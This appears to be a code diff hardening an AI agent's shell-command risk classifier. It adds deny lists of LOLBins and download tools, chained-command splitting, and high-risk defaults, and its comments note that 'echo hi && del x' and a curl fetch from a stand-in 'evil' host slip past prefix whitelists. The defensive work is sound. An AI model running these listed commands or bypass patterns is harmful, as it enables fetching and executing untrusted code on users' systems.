@@ -219,7 +219,7 @@ const tools = {
         'Get-ChildItem', 'Get-Content', 'Get-Process', 'Get-Service', 'Get-Location',
         'Get-Item', 'Get-ItemProperty', 'Select-String', 'Where-Object', 'Measure-Object',
         'Get-Host', 'Get-Command', 'Get-Help', 'Test-Path', 'Get-FileHash',
-        'ping ', 'tracert ', 'pathping ', 'nslookup ', 'curl -L ', 'curl -I ',
+        'ping ', 'tracert ', 'pathping ', 'nslookup ',
         'schtasks /query', 'sc query', 'net user', 'net localgroup', 'net view',
         'fsutil fsinfo', 'diskpart /?', 'chkdsk', 'defrag /?',
       ];
@@ -229,8 +229,7 @@ const tools = {
         'mkdir ', 'md ', 'rmdir ', 'rd ', 'del ', 'erase ',
         'pip install', 'npm install', 'npm run', 'winget install', 'choco install',
         'sc start', 'sc stop', 'sc config', 'net start', 'net stop', 'net use',
-        'taskkill ', 'start ', 'explorer ', 'cmd /c ', 'cmd /k ',
-        'powershell -Command', 'powershell -File',
+        'taskkill ', 'start ', 'explorer ',
         'Set-Content', 'Add-Content', 'New-Item', 'Remove-Item', 'Rename-Item', 'Move-Item', 'Copy-Item',
         'Invoke-Item', 'Start-Process', 'Stop-Process',
         'git add', 'git commit', 'git push', 'git pull', 'git checkout', 'git merge',
@@ -248,6 +247,13 @@ const tools = {
         'taskkill /f', 'tskill',
         'powershell.*invoke-expression', 'powershell.*invoke-webrequest',
         'chmod 777', 'chown -R',
+        // 🔧 B1: shell 逃逸口——可执行任意代码，Agent 模式下 medium 会自动放行，必须始终确认
+        'cmd /c ', 'cmd /k ', 'cmd.exe /c ', 'cmd.exe /k ',
+        'powershell -Command', 'powershell -File', 'powershell -EncodedCommand',
+        'powershell.exe -Command', 'powershell.exe -File', 'powershell.exe -EncodedCommand',
+        'bash -c ', 'sh -c ',
+        // 🔧 B1: 常见 LOLBin 执行宿主（可加载远程脚本/DLL）
+        'mshta ', 'mshta.exe ', 'wscript ', 'cscript ', 'regsvr32 ', 'rundll32 ',
       ];
 
       // 检查是否匹配任何已知命令
@@ -272,14 +278,49 @@ const tools = {
       }
       if (riskLevel !== 'high' && riskLevel !== 'medium') {
         for (var k = 0; k < SAFE_PREFIXES.length; k++) {
-          if (cmdLower.startsWith(SAFE_PREFIXES[k].toLowerCase())) {
+          var sp = SAFE_PREFIXES[k].toLowerCase();
+          if (cmdLower.startsWith(sp) || cmdLower === sp.trim()) {
             riskLevel = 'safe'; break;
           }
         }
       }
 
-      // 未知命令：默认视为中等风险
-      if (riskLevel === 'unknown') riskLevel = 'medium';
+      // ===== 🔧 B1: 防绕过加固 =====
+      // (1) 下载工具落盘 → 可能在投放可执行文件，始终高危。
+      //     前缀白名单只看命令开头，"curl -L http://evil/x.exe -o x.exe" 甚至
+      //     "echo hi && curl ... -o x.exe" 都可能绕过，故对全命令做下载特征扫描。
+      var DOWNLOAD_TOOLS = ['curl ', 'curl.exe ', 'wget ', 'wget.exe ', 'invoke-webrequest', 'iwr ', 'bitsadmin', 'certutil -urlcache', 'certutil.exe -urlcache', 'start-bitstransfer'];
+      var _hasDownloadTool = DOWNLOAD_TOOLS.some(function (t) { return cmdLower.indexOf(t) !== -1; });
+      var _hasFileOutput = /(^|\s)(-o|--output|-o:|-outFile)\b/.test(cmdLower) || cmdLower.indexOf('>') !== -1;
+      if (_hasDownloadTool && _hasFileOutput) {
+        riskLevel = 'high';
+      }
+
+      // (2) 链式命令按段取最高风险：白名单只匹配首段前缀，
+      //     "echo hi && del x" 会借 "echo " 的 SAFE 前缀偷渡危险段。
+      var _chainParts = command.split(/&&|\|\||;|\|/);
+      if (_chainParts.length > 1) {
+        var _rank = { high: 3, medium: 2, safe: 1, unknown: 3 }; // unknown 段按高危处理
+        var _worst = _rank[riskLevel] || 3;
+        for (var ci = 0; ci < _chainParts.length; ci++) {
+          var seg = _chainParts[ci].trim().toLowerCase();
+          if (!seg) continue;
+          var segRisk = 'unknown';
+          for (var hi2 = 0; hi2 < HIGH_RISK_PREFIXES.length; hi2++) {
+            var hp2 = HIGH_RISK_PREFIXES[hi2].toLowerCase();
+            if (hp2.indexOf('.*') !== -1) { if (new RegExp(hp2.replace(/\.\*/g, '.*')).test(seg)) { segRisk = 'high'; break; } }
+            else if (seg.startsWith(hp2)) { segRisk = 'high'; break; }
+          }
+          if (segRisk !== 'high') { for (var mi2 = 0; mi2 < MEDIUM_PREFIXES.length; mi2++) { if (seg.startsWith(MEDIUM_PREFIXES[mi2].toLowerCase())) { segRisk = 'medium'; break; } } }
+          if (segRisk !== 'high' && segRisk !== 'medium') { for (var si2 = 0; si2 < SAFE_PREFIXES.length; si2++) { var sp2 = SAFE_PREFIXES[si2].toLowerCase(); if (seg.startsWith(sp2) || seg === sp2.trim()) { segRisk = 'safe'; break; } } }
+          if ((_rank[segRisk] || 3) > _worst) _worst = _rank[segRisk] || 3;
+        }
+        riskLevel = _worst >= 3 ? 'high' : (_worst === 2 ? 'medium' : 'safe');
+      }
+
+      // (3) 未知命令默认高危（需确认），而非中等风险——
+      //     Agent 模式下 medium 会自动放行，默认 medium 等于放行任意可执行文件。
+      if (riskLevel === 'unknown') riskLevel = 'high';
 
       // 权限检查（permissions 模块的硬阻止）
       if (Core && Core.permissions && Core.permissions.checkCommandExec) {
